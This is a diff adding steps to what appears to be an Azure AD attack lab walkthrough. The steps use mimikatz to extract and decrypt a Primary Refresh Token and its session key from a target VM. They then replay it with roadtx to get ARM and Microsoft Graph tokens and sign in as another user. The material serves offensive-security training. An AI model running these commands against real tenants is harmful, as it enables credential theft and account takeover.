@@ -1342,3 +1342,46 @@ Extract PRT and encrypted Session key from the target VM:
 ```
 Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe sekurlsa::cloudap exit}
 ```
+
+Decrypt key:
+```
+Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe "token::elevate" "dpapi::cloudapkd <KeyValue> /unprotect" "exit"}
+```
+
+Now back on a new session from the attacker VM, we can pass the PRT with the key:
+```
+cd C:\AzAD\Tools\ROADTools
+.\venv\Scripts\activate
+roadtx prt -a renew --prt <prt> --prt-sessionkey <clearkey>
+```
+
+We can use the PRT using multiple methods.
+One interesting way would be to use the browser-based authentication that roadtx provides. This module injects the PRT cookie automatically (something that we previously did manually). Use the following command from virtual environment we have been using for roadtx: 
+```
+(venv) PS C:\AzAD\Tools\ROADTools> roadtx browserprtauth -url https://portal.azure.com
+```
+
+Another way of using PRT would be to request access tokens for ARM and MSGraph (or AADGraph) and use that with the Az PowerShell module.
+In the below commands, we are requesting access tokens for ARM and MSGraph using client ID of the Az PowerShell module (Check out roadtx listaliases for more options): 
+```
+(venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r azrm --tokens-stdout 
+(venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r msgraph --tokens-stdout
+```
+
+Copy the ARM and MSGraph access tokens and save them to ```$token``` and ```$msgraphaccesstoken``` as we have been doing up to now. 
+Use them to connect to the target tenant as the user Michael: 
+```
+$token = 'eyJ0…..'
+$msgraphaccesstoken = 'eyJ0…..'
+Connect-AzAccount -AccessToken $token -MicrosoftGraphAccessToken $msgraphaccesstoken -AccountId michaelmbarron@defcorphq.onmicrosoft.com
+```
+
+We can now use the Az PowerShell module as usual (Note that Michael doesn’t have any permissions on Azure resources):
+```
+Get-AzResource
+Get-AzADUser
+```
+
+
+
+
